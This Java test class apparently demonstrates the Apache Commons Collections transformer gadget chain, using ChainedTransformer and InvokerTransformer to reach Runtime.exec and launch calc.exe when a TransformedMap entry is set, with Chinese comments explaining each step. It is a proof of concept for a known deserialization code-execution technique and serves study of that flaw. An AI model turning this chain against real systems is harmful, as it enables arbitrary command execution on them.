package org.ruos.test;

import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class JavaSeriTest1 {
	public static void main(String[] args) throws Exception {
	    Transformer[] transformers = new Transformer[] {
	        new ConstantTransformer(Runtime.class),
	        new InvokerTransformer("getMethod", new Class[] {
	            String.class, Class[].class }, new Object[] {
	            "getRuntime", new Class[0] }),
	        new InvokerTransformer("invoke", new Class[] {
	            Object.class, Object[].class }, new Object[] {
	            null, new Object[0] }),
	        new InvokerTransformer("exec", new Class[] {
	            String.class }, new Object[] {"calc.exe"})};
	 
	    Transformer transformedChain = new ChainedTransformer(transformers);
	 
	    Map innerMap = new HashMap();
	    innerMap.put("value", "value");
	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
	 
	    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
	    /*
	     * 当上面的代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：
	     * 1,通过ConstantTransformer获得Runtime类，
	     * 2,通过反射调用getMethod找到invoke函数，
	     * 3,运行命令calc.exe。
	     */
	    onlyElement.setValue("foobar");
	 
	}

}
